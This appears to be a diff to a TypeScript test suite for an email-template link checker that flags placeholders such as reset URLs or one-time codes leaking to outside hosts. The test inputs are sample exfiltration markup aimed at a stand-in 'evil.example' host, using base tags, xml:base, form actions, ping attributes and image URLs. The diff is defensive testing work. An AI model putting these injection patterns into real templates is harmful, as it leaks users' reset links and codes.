@@ -22,8 +22,8 @@ const read = (content: unknown) => emailLinks(content, RESET);
 
 describe('the hosts of an email', () => {
   it('a button to this server alone names no host and no problem', () => {
-    expect(read(button('{{resetUrl}}'))).toEqual({ hosts: [], carried: [], problems: [] });
-    expect(read(html('<a href="{{resetUrl}}">Choose a new password</a>'))).toEqual({ hosts: [], carried: [], problems: [] });
+    expect(read(button('{{resetUrl}}'))).toEqual({ hosts: [], carried: [], carries: {}, problems: [] });
+    expect(read(html('<a href="{{resetUrl}}">Choose a new password</a>'))).toEqual({ hosts: [], carried: [], carries: {}, problems: [] });
   });
 
   it('plain links, in words and in fields, without user, port or a closing dot', () => {
@@ -111,13 +111,45 @@ describe('the hosts of an email', () => {
       expect(read(button(url)).problems.length, url).toBeGreaterThan(0);
     }
     // In the path, the host stays where it is.
-    expect(read(button('https://good.example/x/{{name}}?q={{email}}'))).toEqual({ hosts: ['good.example'], carried: ['good.example'], problems: [] });
+    expect(read(button('https://good.example/x/{{name}}?q={{email}}'))).toEqual({ hosts: ['good.example'], carried: ['good.example'], carries: { 'good.example': ['email', 'name'] }, problems: [] });
     expect(read(button('{{resetUrl}}@evil.example')).problems).toContain('it sends {{resetUrl}} to "evil.example"');
   });
 
   it('a backup is read as written', () => {
     expect(read(button('{{resetUrl|https://evil.example/}}')).hosts).toEqual(['evil.example']);
     expect(read(text('Hi {{name|see evil.example}}')).hosts).toEqual(['evil.example']);
+  });
+
+  it('a <base> moves every relative link to its host: a problem, never a host to tick', () => {
+    const based = read(html('<base href="https://evil.example/"><a href="r?t={{resetUrl}}">Reset</a>'));
+    expect(based.problems).toContain('it holds a <base>, which sends every relative link in it to another address');
+    expect(read(html('<base target="_blank"><a href="{{resetUrl}}">Reset</a>')).problems).toContain('it holds a <base>, which sends every relative link in it to another address');
+    expect(read(html('<svg xml:base="https://evil.example/"><a xlink:href="r?t={{resetUrl}}">Reset</a></svg>')).problems).toContain('it holds "xml:base", which sends every relative link under it to another address');
+  });
+
+  it('a value the caller keeps never rides to an outside host, in any link, ticked or not', () => {
+    const kept = (name: string) => name === 'code';
+    const keep = (content: unknown) => emailLinks(content, RESET, kept);
+    for (const code of [
+      '<img src="https://cdn.brand.example/l.png?c={{code}}">',
+      '<img srcset="https://cdn.brand.example/l.png?c={{code}} 2x">',
+      '<a href="https://cdn.brand.example/">Go</a><p style="background:url(https://cdn.brand.example/b?c={{code}})">x</p>',
+      '<a href="https://help.example/" ping="https://cdn.brand.example/p">{{code}}</a><a href="https://help.example/?c={{code}}" ping="https://cdn.brand.example/p">x</a>',
+      '<form action="https://cdn.brand.example/f"><input type="hidden" name="c" value="{{code}}"></form>',
+      '<form id="f" action="https://cdn.brand.example/f"></form><input form="f" type="hidden" value="{{code}}">',
+      '<button formaction="https://cdn.brand.example/f">Go</button><input type="hidden" value="{{code}}">',
+    ]) {
+      expect(keep(html(code)).problems, code).toContain('it sends {{code}} to "cdn.brand.example"');
+    }
+    expect(keep(text('Your code: cdn.brand.example/{{code}}')).problems).toContain('it sends {{code}} to "cdn.brand.example"');
+    // The words of the mail may hold it: only a link to an outside host may not.
+    expect(keep(text('Your code is {{code}}. Help: https://help.example/'))).toEqual({ hosts: ['help.example'], carried: [], carries: {}, problems: [] });
+  });
+
+  it('a form or a ping sent to an outside host carries the placeholders with it', () => {
+    expect(read(html('<form action="https://evil.example/f"><input type="hidden" value="{{resetUrl}}"><input value="{{name}}"></form>')).problems).toContain('it sends {{resetUrl}} to "evil.example"');
+    expect(read(html('<form action="https://forms.example/f"><input type="hidden" value="{{name}}"></form>'))).toEqual({ hosts: ['forms.example'], carried: ['forms.example'], carries: { 'forms.example': ['name'] }, problems: [] });
+    expect(read(html('<a href="{{resetUrl}}" ping="https://evil.example/p">Reset</a>')).problems).toContain('it sends {{resetUrl}} to "evil.example"');
   });
 
   it('the names of blocks and tables are no hosts', () => {
